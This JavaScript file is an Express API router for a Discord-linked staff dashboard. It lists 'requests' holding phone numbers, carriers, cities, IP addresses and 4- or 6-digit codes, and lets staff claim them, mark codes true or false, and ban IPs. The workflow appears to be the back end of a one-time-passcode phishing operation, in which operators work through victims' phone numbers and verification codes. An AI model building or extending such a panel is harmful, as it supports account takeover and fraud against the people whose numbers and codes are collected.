/**
 * web/api.js — JSON API for the dashboard's own JS (src/web/public/app.js)
 *
 * Mounted at /api by server.js, already behind requireStaff (every route
 * here assumes req.session.user exists and is staff). Ban is additionally
 * gated to Owner, mirroring /banip in slash.js.
 */

import express from "express";
import { CONFIG } from "../config.js";
import { getActiveRequests, getStaffLeaderboard } from "../database.js";
import {
    webClaim, webSetLength, webWrongNumber, webUnclaim,
    webTrueCode, webFalseCode, webBanIp,
} from "./actions.js";

/** Best-effort display name for a Discord user ID — cache hit first, REST fetch as a fallback. */
async function resolveUsername(client, userId) {
    if (!userId) return null;
    const cached = client.users.cache.get(userId);
    if (cached) return cached.username;
    try {
        const user = await client.users.fetch(userId);
        return user.username;
    } catch {
        return userId; // last resort — still usable, just not pretty
    }
}

function serializeRequest(row) {
    return {
        id:                 row.id,
        username:           row.username,
        phone:              row.phone,
        operator:           row.operator,
        country:            row.country,
        city:               row.city,
        ip:                 row.ip_address,
        status:             row.status,
        staffCode:          row.staff_code || null,
        codeLength:         row.code_length || null,
        claimedByDiscordId: row.claimed_by_discord_id || null,
        createdAt:          row.created_at,
        updatedAt:          row.updated_at,
    };
}

export function createApiRouter(client) {
    const router = express.Router();

    router.get("/me", (req, res) => {
        const u = req.session.user;
        res.json({ id: u.id, username: u.username, avatar: u.avatar, owner: u.owner, staff: u.staff });
    });

    router.get("/requests", async (req, res) => {
        try {
            const rows = await getActiveRequests();
            res.json(rows.map(serializeRequest));
        } catch (e) {
            console.error("❌ [web] /api/requests error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    router.get("/leaderboard", async (req, res) => {
        try {
            const rows = await getStaffLeaderboard(10);
            res.json(rows);
        } catch (e) {
            console.error("❌ [web] /api/leaderboard error:", e.message);
            res.status(500).json({ error: "db_error" });
        }
    });

    // ── Actions — every handler follows the same shape: run the shared
    // action, translate its {success, message} into an HTTP status the
    // frontend's fetch wrapper understands, log unexpected throws instead of
    // leaking a stack trace to the browser. ──

    function actionRoute(handler) {
        return async (req, res) => {
            const staffUser = { id: req.session.user.id, username: req.session.user.username };
            const ownerBypass = !!req.session.user.owner;
            try {
                const result = await handler(req, staffUser, ownerBypass);
                if (!result.success) return res.status(409).json({ success: false, message: result.message });
                res.json({ success: true });
            } catch (e) {
                console.error(`❌ [web] action error (${req.path}):`, e.message || e);
                res.status(500).json({ success: false, message: "Network/server error." });
            }
        };
    }

    router.post("/requests/:phone/claim", actionRoute((req, staffUser) =>
        webClaim(client, req.params.phone, staffUser)
    ));

    router.post("/requests/:phone/length", actionRoute((req, staffUser, ownerBypass) => {
        const length = Number(req.body?.length);
        if (length !== 4 && length !== 6) return Promise.resolve({ success: false, message: "Length must be 4 or 6." });
        return webSetLength(client, req.params.phone, length, staffUser, ownerBypass);
    }));

    router.post("/requests/:phone/wrong", actionRoute((req, staffUser, ownerBypass) =>
        webWrongNumber(client, req.params.phone, staffUser, ownerBypass)
    ));

    router.post("/requests/:phone/unclaim", actionRoute((req, staffUser, ownerBypass) =>
        webUnclaim(client, req.params.phone, staffUser, ownerBypass, CONFIG.ACCESS_ROLE_ID)
    ));

    router.post("/requests/:phone/truecode", actionRoute((req, staffUser, ownerBypass) =>
        webTrueCode(client, req.params.phone, staffUser, ownerBypass)
    ));

    router.post("/requests/:phone/falsecode", actionRoute((req, staffUser, ownerBypass) =>
        webFalseCode(client, req.params.phone, staffUser, ownerBypass)
    ));

    router.post("/ban", async (req, res) => {
        if (!req.session.user.owner) return res.status(403).json({ success: false, message: "Owner only." });
        const ip = (req.body?.ip || "").trim();
        if (!ip) return res.status(400).json({ success: false, message: "Missing IP." });
        try {
            const result = await webBanIp(ip, { id: req.session.user.id, username: req.session.user.username });
            if (!result.success) return res.status(409).json(result);
            res.json({ success: true });
        } catch (e) {
            console.error("❌ [web] /api/ban error:", e.message);
            res.status(500).json({ success: false, message: "Network/server error." });
        }
    });

    return router;
}
